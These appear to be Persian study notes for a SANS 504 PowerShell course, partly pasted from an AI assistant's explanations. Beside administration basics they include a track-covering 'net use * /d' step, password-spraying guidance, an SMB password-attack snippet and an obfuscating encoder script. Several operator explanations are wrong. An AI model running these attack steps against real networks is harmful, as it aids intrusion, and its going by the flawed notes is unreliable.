[[SANS 504]]



یک **محیط خط فرمان (Command-Line Interface)** و **زبان اسکریپت‌نویسی** قدرتمند که توسط مایکروسافت توسعه داده شده تا مدیریت سیستم‌ها و اتوماسیون کارها رو راحت‌تر کنه.


- **Object-Oriented** هست (برخلاف Command Prompt که متن برمی‌گردونه، PowerShell با اشیاء کار می‌کنه).
    
- روی **.NET Framework** (و نسخه‌های جدید روی .NET Core) ساخته شده.
    
- امکان اجرای **دستورات (cmdlets)**، استفاده از **اسکریپت‌ها**، و حتی فراخوانی مستقیم توابع .NET و API سیستم رو داره.
    
- هم برای مدیریت ویندوز و هم سیستم‌عامل‌های دیگر مثل لینوکس و macOS قابل استفاده است (نسخه PowerShell Core).
    
- می‌تونه کارهای پیچیده مثل مدیریت Active Directory، سرورها، سرویس‌ها، و حتی Cloud رو اتوماتیک کنه.



شیء‌گرا یا **Object-Oriented** یعنی به‌جای اینکه فقط با متن یا عدد خام کار کنیم، با **اشیاء (Objects)** که هم **داده‌ها** رو دارند و هم **رفتارها** رو، سروکار داریم.

در این مدل:

- **داده‌ها** داخل **Properties** ذخیره میشن (ویژگی‌ها)
    
- **رفتارها یا عملیات‌ها** داخل **Methods** قرار دارن (متدها)
    

---

🔹 **مثال در دنیای واقعی**  
فرض کن یک "خودرو" داریم:

- **Properties** (ویژگی‌ها): رنگ، مدل، سرعت فعلی
    
- **Methods** (رفتارها): روشن شدن، ترمز گرفتن، تغییر دنده
    

به جای اینکه بگیم:

```
سرعت = 80
ترمز()
```

ما میگیم:

```
Car.Speed
Car.Brake()
```

اینجا `Car` یک **Object** هست که هم اطلاعاتش رو داریم و هم کارهایی که می‌تونه انجام بده.

---

🔹 **مثال در PowerShell**  
وقتی در CMD دستور زیر رو میدی:

```
date
```

فقط یک متن ساده برمی‌گردونه.

ولی در PowerShell:

```powershell
Get-Date
```

یک **Object** از نوع `DateTime` برمی‌گردونه که می‌تونی مستقیم با ویژگی‌ها و متدهاش کار کنی:

```powershell
(Get-Date).Year     # سال
(Get-Date).DayOfWeek  # روز هفته
(Get-Date).AddDays(5) # پنج روز بعد
```

یعنی به‌جای پردازش متن، مستقیم با **ساختار داده‌ای آماده و رفتارهای مرتبط** کار می‌کنی.

---

اگر بخوای، می‌تونم برات یک تصویر ذهنی بکشم که دقیقاً فرق Object-Oriented و غیر Object-Oriented رو نشون بده.





 Add-Computer -ComputerName << charon >>  -DomainName test.lcoal -Credential test\charonc -Restart

در این دستور ما میایم یک کامپیوتر رو در شبکه دامین جوین میکنیم 

 Add-Compute ----> اظافه کردن کامپیوتر 
 -ComputerName ----- > اسم کامپیوتر رو بهش میدیم 
 -DomainName ----> اسم دامین رو بهش میدیم 
 -Credential ----> با چه یوزری عضو شبکه دامین بشه 
 -Restart -----> در نهایت هم ری استارت شه


Add-Computer -ComputerName charon -UnjoinDomainCredential test.lcoal\charon -WorkgroupName "local_charon"

با این دستور هم یک کامپیتور رو از شبکه دامین خارج میکنیم 

-UnjoinDomainCredential test.lcoal\charon
 با این دستور میایم اون یوزری که قراره از شبکه دامین حذف شود رو میگیم

 -WorkgroupName "local_charon" ------> با این دستور هم میگیم حالا عضو شبکه workgroup باید بشی و اسم شبکه workgroup رو میدیم

========================

 "to day is $(Get-Date)"
 در این دستور ما میگیم که to day is هست و بعدش یک دستور رو به عنوان متغیر دادیم که جوابش میشه 
 
to day is 05/28/2025 13:39:26

اگر دستور Get-Date درون یک رشته باشه بدون $ و پرانتز یعنی اون هم 


========================================


New-ADUser -name "charon" -GiveName  "amin" -Surname "arzhang" -userprincipalname "a.arzhang" -path "OU=it,DC=charon,DC=local"

Enable-ADAccount "a.arzhang" 

set-ADAccountPassword "12345678"

=========================================

علامت  `  به معنی این است که که متغیر داخل رشته مون به شکل کامنت نمایش داده شود 


=========

install-windowsfeature -name dhcp -includemanagementtools


=========

با استفاده از این دستور ما میتونیم dhcp سرور رو نصب کنیم 



get-windowsfeature 
 با استفاده از این دستور موا لیست تمایمه فیچر هایی که نصب کردیم رو میتونیم مشاهده کنیم 

===============================================================


-eq  ---> equal   

به این معنی است که باید برابد باشد 

مثلا 
"charon" -eq "charon"     ------> True

معادل برنامه نویسی میشه همون 
"charon" == "charon" -------> True


-ne ----> Not equal 

charon -ne charon -----> False
charon -ne CHARON -----> True 


-ge ------> greater than 
مثلا 

10 -ge 9 -----> True | OR | 9  -ge  10 ------> False

یعنی اینکه ایا 10 بزرگ تر از 9 جواب  درسته و یا معکوس این کار 



-like 
میره میگرده و میبینه که ایا داخل اون متغیر یا همون رشته کلمه شبیه چیزی که من دادم هست یا نه 

مثلا 
"Just linux " -like "Just Windws" ------>False

خب الان داره این دوتا رشته رو برسی میکنه که ببینه شبیه هم هستند یا نه اما 

"just linux" -like "just*" ----> True 

یعنی دیگر توجهی به بعدش نداره 



"charon" -math "on" ----> True

در پارامتر -and باید یا دو طرف درست باشه یا غلط اگر یه طرف درست باشه و طرف دیگر غلط پارامتر  -and  غلط رو جواب میده 

(1 -eq 1 ) -and (1 -eq 2) ------> False

-not  |   !   |      ------>   not  


-is 
-isnot
-as

==============================================================
Get-ChildItem -Path "C:\Users\charon\Desktop\" -Recurse | Select-String -Pattern "main" -list | Format-Table -Wrap Path 
پیدا کردن اون کلمه 

دوتا دستور بعد از IOC این دوتا دستور 
net use -----> من به کچا ها وصل شدم 
net session -------> کیا به من وصل شدند
net use * /d ----> این دستور میاد تمامیه session ها رو پاک میکنه 
که در فرایند covering traks هم انجام میشود


password spraying 

این روش برای  جلوگیری از لاک شدن یک سیستم است 
در این روش ما میایم به جای یک ورد لیست برای تست کردن روی یک اکانت استفاده میکنیم میایم دو یا سه تا کلمه استفاده میکنیم اما همون دو یا سه تا کلمه عبور رو میایم روی اکانت های زیادی تست میکنیم 
نکته یی که وجود دارد این است که ما باید سیاست اون شبکه برای احراز هویت رو بشناسیم یا از طریق sysvol و یا تست روی یک سیستم برای اینکه بفهمیم چقدر 4624 بگیریم لاک میشیم

نکته : لاک شدن پسورد یا بعد از اون تایم که ست شده reset میشه یا بعد از 4625


Get-Acl ----> show permision 
این cmdlet میاد برای ما اطلاعات مربوط از جمله سطح دسترسی یک فایل رو به ما نشون میدهد 


$PSVersionTable -----> show information of powershell for example version powrshell

get-location -----> pwd
set-location -----> cd 
new-item ----> create file or enyversiry
با استفاده از دستور new-item میتونیم یک ایتم ایجاد کنیم مثلا فولدر داکیومنت و.....

Select-Object ------> grep 


ساختار دستورات powershell از بخش های مختلفی تشکیل شده 

Get-Process  -Name svchost 

Get-Process ----> cmdlet 
-Name ------> Parametr
svchost -------> value -----> وابسته به پارامتر 

Get-Help -Name Get-Process -Full 
Get-Help ----> cmdlet 
-Name ------> Parameter 
Get-Process -----> Value 
-Full --------> Switch

سوییچ وابسته به پارامتری نیست 
سوییچ های معروف در پاورشل 
Full 
Force -----> این سوییج میاد هرطور شده دستور رو اجرا میکنه
wahtif


ConvertTo-Csv -----> convert output the file format for exmaple 4
ConvertTo-HgsKeyProtector
ConvertTo-Html
ConvertTo-Json 
and ...........

Set-Clipboard ------> copy command 


powershell    = = hashtable    ||||      == ditinery on python

$information = @{name = "amin"; fmily = "arzhang"; age = "19"} 



## 🔸 `-lt` در PowerShell چیست؟

`-lt` یک **عملگر مقایسه‌ای (comparison operator)** در PowerShell است.

### ✅ معنی:

`-lt` مخفف "**less than**" یعنی:

> مقدار سمت چپ **کمتر از** مقدار سمت راست است یا نه؟


| عملگر | معنی                    | مثال               |
| ----- | ----------------------- | ------------------ |
| `-eq` | مساوی (equal)           | `5 -eq 5` → True   |
| `-ne` | نامساوی (not equal)     | `5 -ne 3` → True   |
| `-lt` | کمتر از (less than)     | `3 -lt 5` → True   |
| `-le` | کمتر مساوی              | `3 -le 3` → True   |
| `-gt` | بیشتر از (greater than) | `10 -gt 5` → True  |
| `-ge` | بیشتر مساوی             | `10 -ge 10` → True |
|       |                         |                    |
|       |                         |                    |


Get-ExecutionPolicy ---> policy for run script 
bypass 



```
$encoder = Get-Content -Path "C:\Users\charon\Desktop\powershell.ps1" -encoding ascii

$out =  ""
  
foreach($line in $encoder){

    foreach($char in $line.ToCharArray()){
    
        $str = [int][char]$char
        $str -= 9
        if ($str -lt 100){
            
            $str = '0' + $str
            
        }   
        $out += $str    
    
    }

}

$out
```

[^1]: Encoder





دلیل اینکه اتکر ها از  powrshell استفاده میکنند اینه که 
پاورشل به صورت پیش فرض روی همه سیستم ها ویندوز از سری 7 هست و همین دلیل یعنی که نیاز نیست ابزار جدید نصب کی (LOTL) living of the land 

### ✅ 2. **دسترسی کامل به سیستم و APIها**

- PowerShell می‌تونه با **Windows API**، **WMI**، **Registry**، **File System**، و حتی **.NET Framework** کار کنه.
    
- یعنی اتکر می‌تونه:
    
    - کاربر جدید بسازه
        
    - پسوردها رو استخراج کنه
        
    - سرویس‌ها رو خاموش/روشن کنه
        
    - اطلاعات سیستم رو بگیره
        
    - به حافظه دسترسی پیدا کنه و حتی شِل کد اجرا کنه!
اتکر میتونه مستقیم بدون نیاز به فایل کدش رو روی RAM اجرا کنه 


### ✅ 4. **پشتیبانی از رمزنگاری و دانلود از اینترنت**

- PowerShell به راحتی می‌تونه:
    
    - از اینترنت اسکریپت یا payload دانلود کنه (`Invoke-WebRequest`)
        
    - اسکریپت‌ها رو **رمزنگاری شده** اجرا کنه
        
    - داده‌ها رو encode/decode کنه (Base64 و غیره)


اگر بخواهیم روی کامپیوتر خودمون به صورت ریموت روی یک کامپیوتر دیگه دستوری رو اجرا کنیم کافیه که فقط به سوییج computer-name اسم کامپیوتر رو بدیم 


دستور get-hotfix میاد برای ما لیست اپدیت ها را با مشخصات نشون میده


اپراتور ها عملیات هایی هستند که روی داده ها پردازشی را انچام میدهند مثلا عبارت  -eq که میاد برای ما برابر بودن رو چک میکنه 
یا عبارت  -and | -or | -not ! 
یا عبارت های بولی True یا  False یا عبارت های ریاضی ماننده +-*/% 
و سایر علامت ها برای دیگر چزه اپراتور ها محسوب میشوند 

در اپراتور ها عبارت -replace و یه مقداری میاد میگرده داخل اون string و بعد  از اون کلمه رو بهمون برمیگردونه مثلا 
"hello martin nad powershell" -replace "nad"
result :  hello martin
یک عبارت دیگر میشه -match 
این عبارت میاد برای میگرده داخل اون string دنبال اون کاراکتری که ما بهش دادیم 
مثلا 
"hello martin and  powrshell" -match "martin"
result : True 
چون داخل اون string کلمه martin وجود دارد 
نکته : replcae میتونه یه مقداری رو به اون string اضافه کنه
"hello martin" -replace "hello","amin"
result : amin martin
کلمه martrin تبدیل شد به amin

اپراتور بعدی به این معنی است که میاد یه کلمه یی رو از ما میگیره و میگرده داخل اون  string که ببینه که ایا وجود دارد یا نه 
"lo" -in "hello powershell","lo"
True


سؤال خیلی مهم و کاربردی‌ایه مارتین 👏  
به‌خصوص اگه وارد دنیای **PowerShell، مدیریت سیستم، اتوماسیون یا حتی امنیت و هک قانونی** بشی، باید بدونی:

> 🔹 **WMI**  
> 🔹 **COM**  
> 🔹 **ADSI**  
> سه نوع **مدل دسترسی به اشیاء سیستم** هستن که PowerShell (و سایر زبان‌ها) برای تعامل با سیستم‌عامل و منابع ویندوز ازشون استفاده می‌کنن.

بیا با زبان ساده بررسیشون کنیم 👇

---

## 🔶 1. WMI (Windows Management Instrumentation)

### 📌 چیه؟

WMI یه رابط استاندارده برای اینکه بتونی اطلاعات مدیریتی از سیستم بگیری یا تغییری توی سیستم ایجاد کنی.

### 📚 برای چه استفاده می‌شه؟

- گرفتن لیست پروسس‌ها، سرویس‌ها، سخت‌افزار، وضعیت سیستم و...
    
- اجرای اسکریپت از راه دور
    
- مدیریت سیستم‌ها از طریق PowerShell یا سایر ابزارها
    

### ✅ مثال در PowerShell:

```powershell
Get-WmiObject -Class Win32_Process
```

یا برای گرفتن MAC Address:

```powershell
Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object MACAddress
```

---

## 🔶 2. COM (Component Object Model)

### 📌 چیه؟

COM یه مدل برنامه‌نویسی قدیمی در ویندوزه که به نرم‌افزارها اجازه می‌ده **بین زبان‌ها یا فرآیندهای مختلف با هم ارتباط داشته باشن**.

### 📚 برای چه استفاده می‌شه؟

- کنترل نرم‌افزارهای Office (مثلاً Word, Excel)
    
- کار با فایل‌های خاص
    
- ایجاد کادرهای دیالوگ، اجرای اسکریپت‌ها و ...
    

### ✅ مثال در PowerShell:

```powershell
$excel = New-Object -ComObject Excel.Application
$excel.Visible = $true
```

یا اجرای دیالوگ باز کردن فایل:

```powershell
$dialog = New-Object -ComObject Shell.Application
$dialog.BrowseForFolder(0, "Choose Folder", 0)
```

📌 خیلی از اکسپلویت‌ها و بدافزارها هم از COM برای **فرار از آنتی‌ویروس** یا **اجرای کد بدون اجرای فایل EXE** استفاده می‌کنن.

---

## 🔶 3. ADSI (Active Directory Service Interfaces)

### 📌 چیه؟

ADSI رابطیه برای دسترسی و مدیریت **Active Directory یا سایر دایرکتوری‌سرویس‌ها** (مثل LDAP).

### 📚 برای چه استفاده می‌شه؟

- گرفتن لیست یوزرها یا گروه‌ها
    
- تغییر مشخصات یوزرها در AD
    
- مدیریت domain controllerها
    
- اسکریپت‌نویسی در شبکه‌های دامینی
    

### ✅ مثال در PowerShell:

```powershell
$User = [ADSI]"WinNT://./Administrator,user"
$User.FullName
```

یا برای گرفتن لیست گروه‌ها:

```powershell
$Groups = [ADSI]"WinNT://./Administrators,group"
$Groups.Members() | ForEach-Object { $_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null) }
```

---

## 🔁 خلاصه مقایسه:

|مدل|کاربرد|مثال|
|---|---|---|
|**WMI**|گرفتن اطلاعات یا اعمال تغییرات در سیستم|`Get-WmiObject -Class Win32_BIOS`|
|**COM**|اجرای توابع از اپلیکیشن‌های COM مانند Excel/Word|`New-Object -ComObject Excel.Application`|
|**ADSI**|تعامل با Active Directory و حساب‌های کاربری|`[ADSI]"WinNT://./Administrator"`|

---


حتماً! توی PowerShell، ما دو دسته حلقه و فیلتر داریم که خیلی شبیه به نظر میان ولی فرق‌های مهمی با هم دارن. بیایم با دقت، گام‌به‌گام توضیح بدیم:

---

## ✅ فرق بین `for` و `foreach`

### 🔹 `for` loop

مثل سایر زبان‌ها (مثل C یا JavaScript)، این حلقه برای زمانی خوبه که تعداد دفعات اجرا رو **از قبل می‌دونی**.

```powershell
for ($i = 0; $i -lt 5; $i++) {
    Write-Output "عدد: $i"
}
```

📌 **کاربرد اصلی:**

- شمارش با اندیس (index)
    
- تکرار با کنترل کامل بر شروع، پایان، و افزایشی یا کاهشی بودن حلقه
    

---

### 🔹 `foreach` loop

این حلقه روی **آیتم‌های یک مجموعه (Collection)** کار می‌کنه. نیازی به شمارنده نداری.

```powershell
$names = @("Ali", "Sara", "Reza")
foreach ($name in $names) {
    Write-Output "نام: $name"
}
```

📌 **کاربرد اصلی:**

- پیمایش لیست‌ها، آرایه‌ها، خروجی‌های دستورات
    

---

## ✅ فرق بین `Where-Object` و `ForEach-Object`

اینا دو **cmdlet** هستن که معمولاً داخل **pipeline (`|`)** استفاده می‌شن.

---

### 🔹 `Where-Object`

برای **فیلتر کردن** آیتم‌ها بر اساس شرط استفاده می‌شه.

```powershell
1..10 | Where-Object { $_ % 2 -eq 0 }
```

📌 توضیح:

- این کد فقط عددهای زوج رو چاپ می‌کنه.
    
- `$_` یعنی "آیتم فعلی در خط لوله".
    

---

### 🔹 `ForEach-Object`

برای **اجرای عملیاتی روی هر آیتم** در خط لوله استفاده می‌شه.

```powershell
"Ali", "Sara", "Reza" | ForEach-Object { "سلام $_" }
```

📌 توضیح:

- اینجا روی هر آیتم یک عملیات انجام می‌دیم (سلام گفتن).
    

---

## 🔄 مقایسه کوتاه همه موارد

|دستور|نوع|کاربرد|نمونه استفاده|
|---|---|---|---|
|`for`|حلقه سنتی|شمارش، کنترل کامل روی index|`for ($i=0; ...)`|
|`foreach`|حلقه|پیمایش مجموعه‌ها|`foreach ($x in $arr)`|
|`Where-Object`|فیلتر داده|حذف یا انتخاب آیتم‌ها بر اساس شرط|`...|
|`ForEach-Object`|اجرای عملیات|اعمال کار روی هر آیتم|`...|

---



disable SMB version 1

Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol

Get-WmiObject -Class win32_share -ComputerName 192.168.171.155


net.exe view \\192.168.1.73 /all

SMB PAssword Attack

$user = 'ksmith'
$password = "passwordlist"
New-SmbMapping -LocalPath Y: -RemotePath \\192.168.1.73\files
-UserName $user -Password $pass

======================================================================

get parametr << computername >>

Get-Command -CommandType  Cmdlet | Where-Object {$_.Parameters.Keys -contains "computername"}

====================================================================== 

test connection is the PC and network for example 

foreach ($charon in ('charon','google.com','vaja.ir')){Test-Connection $charon}

cmdlet : test-connection


===============================================================

Get-Help gm  -ShowWindow

 parametr : -ShowWindow ------>  envirement GUI 
===============================================================




دستور `PSSession` در پاورشل برای ایجاد، مدیریت و استفاده از **نشست‌های از راه دور (remote sessions)** بین سیستم‌ها استفاده می‌شه. این قابلیت بخشی از PowerShell Remoting هست که بهت اجازه می‌ده روی یک کامپیوتر دیگه، دستورات پاورشل رو از راه دور اجرا کنی.

---

## ✅ کاربرد اصلی PSSession

- اجرای دستورات روی یک سیستم از راه دور (مثلاً یک سرور یا کلاینت در شبکه)
- مدیریت چند دستگاه به‌صورت هم‌زمان
- خودکارسازی کارهای مدیریتی بدون ورود مستقیم به دستگاه‌ها

---

## 💡 دستورات کلیدی مربوط به PSSession

| دستور              | توضیح                                        |
| ------------------ | -------------------------------------------- |
| `New-PSSession`    | ایجاد یک نشست ریموت                          |
| `Enter-PSSession`  | ورود به نشست ریموت برای اجرای مستقیم دستورات |
| `Invoke-Command`   | اجرای دستورات روی یک یا چند نشست ریموت       |
| `Get-PSSession`    | لیست نشست‌های فعلی را نشان می‌دهد            |
| `Remove-PSSession` | بستن نشست ریموت و آزادسازی منابع             |

---
query on system join to domain 

New-PSSession -ComputerName charon -Credential domainDC\
## 🧪 مثال‌های کاربردی

### 🔹 1. ایجاد یک نشست از راه دور:
```powershell
$session = New-PSSession -ComputerName Server01
```

### 🔹 2. اجرای دستور در آن نشست:
```powershell
Invoke-Command -Session $session -ScriptBlock { Get-Process }
```

### 🔹 3. ورود تعاملی به آن سیستم:
```powershell
Enter-PSSession -ComputerName Server01
```

حالا می‌تونی انگار جلوی اون سیستم نشستی، دستور بزنی.

### 🔹 4. خروج از نشست:
```powershell
Exit-PSSession
```

### 🔹 5. بستن نشست:
```powershell
Remove-PSSession -Session $session
```

---

## 🛡️ نکته امنیتی مهم:
برای اینکه `PowerShell Remoting` کار کنه، باید روی سیستم مقصد **فعال باشه**:

```powershell
Enable-PSRemoting -Force
```

و اگه سیستم مقصد روی ویندوز فایروال داره، باید تنظیماتش باز بشه، و اگر از **Workgroup** استفاده می‌کنی (نه دامین)، نیاز به پیکربندی‌های بیشتری هست مثل TrustedHosts.

---


---

### 🎯 PowerShell Jobs چیست؟

در PowerShell، **job** یعنی اجرای یک دستور یا اسکریپت به‌صورت **غیربلوک‌کننده (asynchronous)** یا به عبارتی **در پس‌زمینه (background)**.

یعنی وقتی شما یک job اجرا می‌کنی، ترمینال فوراً بهت برمی‌گرده و منتظر نمی‌مونه تا اون دستور تموم بشه. این خیلی مفیده وقتی می‌خوای چند کار طولانی هم‌زمان انجام بدی بدون اینکه جلوی بقیه فرمان‌ها رو بگیره.

---

### 🧪 مثال ساده:

```powershell
Start-Job -ScriptBlock { Get-Process }
```

این دستور یه job ایجاد می‌کنه که لیست پراسس‌ها رو می‌گیره، ولی اجرای اون به‌صورت پس‌زمینه انجام میشه.

---

### 🧰 چند دستور مهم برای کار با Jobs:

|دستور|توضیح|
|---|---|
|`Start-Job`|اجرای یک job جدید|
|`Get-Job`|مشاهده لیست jobهای فعال|
|`Receive-Job`|دریافت خروجی job (بعد از تمام شدنش)|
|`Remove-Job`|حذف job از لیست|
|`Stop-Job`|متوقف کردن job در حال اجرا|

---

### 📌 یک مثال کامل:

```powershell
$job = Start-Job -ScriptBlock { Get-Date; Start-Sleep -Seconds 5; Get-Date }
Get-Job
Receive-Job -Id $job.Id -Wait
Remove-Job -Id $job.Id
```

در این مثال:

1. یک job ایجاد می‌شه که زمان رو می‌گیره، ۵ ثانیه مکث می‌کنه و دوباره زمان رو نشون می‌ده.
    
2. با `Get-Job` می‌تونی ببینی که job در چه وضعیتی هست.
    
3. با `Receive-Job` خروجی job رو می‌گیری.
    
4. با `Remove-Job` اونو پاک می‌کنی.
    

---

### 🔄 تفاوت با Runspaces یا Threads؟

Jobs ساده‌تر از مفاهیم پیشرفته‌تری مثل `Runspaces` یا `Threads` هستن، ولی برای کارهای موازی ساده و سریع کاملاً کافی‌ان.

---
حتماً! بیا با یه توضیح **ساده، کاربردی و مرحله‌به‌مرحله** به سراغ `.NET` بریم، مخصوصاً برای اینکه بدونی **چی هست**، **چه فایده‌ای داره** و **چطور توی PowerShell استفاده میشه**.

---

## 🧩 1. .NET چیه؟ (خیلی ساده)

`.NET` (یا DotNet) یک **پلتفرم برنامه‌نویسی ساخت مایکروسافت** هست که اجازه میده:

- برنامه‌های دسکتاپ، وب، موبایل، گیم و سرویس‌ها نوشته بشن.
    
- به زبون‌هایی مثل C#, F#, VB.NET نوشته بشن.
    
- به راحتی با **ویندوز و سیستم‌عامل‌های دیگه** کار کنن.
    

### 🔧 شامل چیزهایی مثل:

- **CLR** (موتور اجرا، شبیه موتور ماشین مجازی جاوا)
    
- **کلاس‌های آماده** (برای کار با فایل، اینترنت، بانک‌اطلاعاتی، رمزنگاری و ...)
    
- **زبان‌های برنامه‌نویسی**
    
- **پکیج‌ها و کتابخانه‌ها**
    

---

## 🧠 2. .NET چه کاربردی داره؟

.NET مثل یه **جعبه ابزار عظیم** هست. مثلا برای:

- ساخت اپلیکیشن‌های ویندوز (Windows Forms, WPF)
    
- برنامه‌های تحت وب (ASP.NET)
    
- بازی‌سازی (Unity از .NET استفاده می‌کنه)
    
- اسکریپت‌نویسی سیستمی (مثل PowerShell)
    

---

## ⚙️ 3. PowerShell و .NET چه ربطی دارن؟

PowerShell خودش **بر پایه‌ی .NET ساخته شده**!  
یعنی در PowerShell، شما می‌تونی مستقیماً از کلاس‌ها و توابع .NET استفاده کنی!

---

## 🧪 4. چند مثال ساده استفاده از .NET در PowerShell:

---

### ✅ مثال 1: نمایش زمان فعلی با .NET

```powershell
[DateTime]::Now
```

کلاس `DateTime` از .NET هست و تابع `Now` زمان فعلی رو نشون میده.

---

### ✅ مثال 2: محاسبه هش MD5 یک متن

```powershell
$md5 = [System.Security.Cryptography.MD5]::Create()
$bytes = [System.Text.Encoding]::UTF8.GetBytes("Hello")
$hash = $md5.ComputeHash($bytes)
[BitConverter]::ToString($hash) -replace '-', ''
```

اینجا با استفاده از کلاس‌های `.NET` عملیات رمزنگاری انجام میدیم.

---

### ✅ مثال 3: نمایش MessageBox گرافیکی

```powershell
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("سلام مارتین!")
```

---

## 📚 5. چطوری کلاس‌های .NET رو پیدا کنیم؟

دو راه:

1. **مستندات رسمی**:  
    [https://learn.microsoft.com/en-us/dotnet/api/](https://learn.microsoft.com/en-us/dotnet/api/)
    
2. **داخل PowerShell**:
    

```powershell
[System.Math] | Get-Member
```

---

## 🧱 جمع‌بندی ساده:

|سؤال|جواب|
|---|---|
|.NET چیه؟|یک پلتفرم برنامه‌نویسی برای ساخت نرم‌افزارها|
|چه فایده‌ای داره؟|ابزارهای آماده برای رمزنگاری، تاریخ، شبکه، فرم و ...|
|در PowerShell چطور استفاده میشه؟|با نوشتن `[Namespace.ClassName]::Method()`|

---

خیلی سؤال مهم و کلیدی‌ای پرسیدی، چون خیلیا تفاوت `AppDomain` با `Process` رو قاطی می‌کنن، مخصوصاً وقتی با مفاهیم سطح پایین‌تر سیستم عامل یا دات‌نت کار می‌کنن.

---

## ✅ خلاصه سریع:

| مفهوم         | سطح           | تعریف ساده                                                                           |
| ------------- | ------------- | ------------------------------------------------------------------------------------ |
| **Process**   | سیستم‌عامل    | یه برنامه‌ی مستقل در حال اجرا، با حافظه‌ی جدا، PID و منابع خاص                       |
| **AppDomain** | دات‌نت (.NET) | یه محیط ایزوله داخل یک **process دات‌نتی** برای اجرای امن‌تر و کنترل‌شده‌ی اسمبلی‌ها |

---

## 🔍 تفاوت‌های دقیق و کامل:

|ویژگی|**Process**|**AppDomain**|
|---|---|---|
|📦 سطح اجرایی|متعلق به سیستم‌عامل|متعلق به پلتفرم .NET|
|🧠 حافظه‌ی جدا|بله؛ هر Process فضای حافظه‌ی خودش رو داره|خیر؛ AppDomainها حافظه رو با Process خودشون به اشتراک می‌ذارن|
|🔄 اجرا به‌صورت موازی|بله؛ Processها کاملاً مستقل اجرا می‌شن|بله، ولی داخل همون Process اصلی|
|📛 PID (شناسه‌ی پردازش)|داره؛ از طریق Task Manager قابل مشاهده است|نداره؛ فقط درون دات‌نت قابل شناسایی است|
|🧱 ایزولاسیون|بسیار بالاست؛ بین Processها تبادل مستقیم نیست|ایزوله در سطح دات‌نت، نه سیستم‌عامل|
|🔐 امنیت|امنیت سیستمی و دسترسی‌ها به منابع OS|امنیت سطح دات‌نت (مثلاً محدودیت بارگذاری DLL، اجرای کد مشکوک)|
|🔧 مدیریت منابع|توسط سیستم‌عامل|توسط CLR در .NET|
|🧰 قابلیت Unload شدن|کل Process باید متوقف بشه|AppDomainها قابل unload هستن بدون بستن کل برنامه|
|📂 نمونه‌ها|notepad.exe، powershell.exe، chrome.exe|PowerShell AppDomain، ASP.NET AppDomain، DLLهای دات‌نتی|

---

## 👁️‍🗨️ یک مثال تصویری ذهنی:

🔹 فرض کن کامپیوتر یه ساختمونه  
🔹 هر **Process** مثل یه طبقه‌ی جداست  
🔹 هر **AppDomain** مثل اتاق‌های داخل همون طبقه‌ست

پس:

- طبقات کاملاً از هم جدا هستن (Processها ایزوله)
    
- ولی اتاق‌های داخل یک طبقه می‌تونن منابعی رو با هم به اشتراک بذارن (AppDomainها درون یک Process)
    

---

## 🎯 یک مثال واقعی:

فرض کن برنامه‌ای با C# ساختی که چند تا DLL داره:

- وقتی این برنامه اجرا میشه، یک **Process** ساخته میشه (مثلاً `myapp.exe`)
    
- اون برنامه توی این Process یه **AppDomain** داره که همه کلاس‌ها و DLLها اونجا لود می‌شن
    
- اگه بخوای یه DLL مشکوک رو ایزوله اجرا کنی بدون اینکه کل برنامه‌ت آسیب ببینه، می‌تونی یه AppDomain جدا بسازی و اون DLL رو اونجا بارگذاری کنی
    

---

## 🧪 مشاهده Process و AppDomain در PowerShell:

### مشاهده PID (شناسه پردازش PowerShell):

```powershell
Get-Process -Id $PID
```

### مشاهده AppDomain فعلی:

```powershell
[System.AppDomain]::CurrentDomain.FriendlyName
```

---

## ✨ نتیجه‌گیری ساده:

|اگر بخوای...|استفاده کن از|
|---|---|
|چند برنامه‌ی کاملاً جدا با منابع و امنیت خاص|`Process`|
|اجرای چند بخش جدا از برنامه در یک محیط امن و قابل مدیریت در .NET|`AppDomain`|

---


---

## 🧩 `Add-Type` چیست؟

`Add-Type` یک **دستور (cmdlet)** در PowerShell هست که به تو اجازه می‌ده:

> 📌 **کد .NET** (مثل C#) رو به‌صورت مستقیم **داخل PowerShell تعریف و استفاده کنی**.

به زبان ساده:  
با `Add-Type` می‌تونی کلاس، تابع، ساختار یا متدهایی رو از دنیای C# / .NET داخل PowerShell تزریق کنی و ازش استفاده کنی.

---

## 🔧 ساختار کلی

```powershell
Add-Type -TypeDefinition @"
public class MyMath {
    public static int Add(int a, int b) {
        return a + b;
    }
}
"@ -Language CSharp
```

و بعد استفاده:

```powershell
[MyMath]::Add(5, 3)
```

📌 خروجی: `8`

---

## ✅ چرا در PowerShell به‌خصوص وقتی با .NET کار می‌کنی استفاده می‌شه؟

|دلیل|توضیح|
|---|---|
|استفاده از کلاس‌های سفارشی|اگه PowerShell چیزی رو از پیش نداشته باشه، می‌تونی با C# بنویسی و واردش کنی.|
|دسترسی به توابع low-level|مثل Windows APIها یا عملیات سطح پایین مثل memory manipulation یا P/Invoke.|
|افزایش عملکرد|گاهی توابعی که با C# می‌نویسی سریع‌تر از معادل PowerShell هستند.|
|توسعه ابزارهای امنیتی / رمزنگاری|مثلاً برای پیاده‌سازی دقیق‌تر الگوریتم‌های رمزنگاری یا مهاجم‌محور (مثلاً DLL Injection یا Process Hollowing).|

---

## 📦 مثال: نمایش پیام با استفاده از Windows Forms

```powershell
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("سلام مارتین!")
```

---

## 🔥 مثال کاربردی‌تر: تولید بایت‌های تصادفی با C#

```powershell
Add-Type @"
using System;
public class Crypto {
    public static byte[] GetRandomBytes(int size) {
        var rng = new System.Security.Cryptography.RNGCryptoServiceProvider();
        byte[] bytes = new byte[size];
        rng.GetBytes(bytes);
        return bytes;
    }
}
"@

# استفاده:
[Crypto]::GetRandomBytes(8)
```

---

## 📌 نکات مهم:

- `-TypeDefinition`: متن کد C# بین `@" "`@ میاد.
    
- می‌تونی از `-ReferencedAssemblies` هم استفاده کنی اگه اسمبلی خارجی نیاز داری.
    
- فقط یک بار در هر سشن اجراش کنی کافیه (مگر این‌که سشن عوض بشه).
    

---


---

## ✅ `System.Windows.Forms` چیه؟

`System.Windows.Forms` یک **namespace** (فضای‌نام) در **فریم‌ورک .NET** هست که برای ساخت **رابط کاربری گرافیکی (GUI)** استفاده می‌شه.

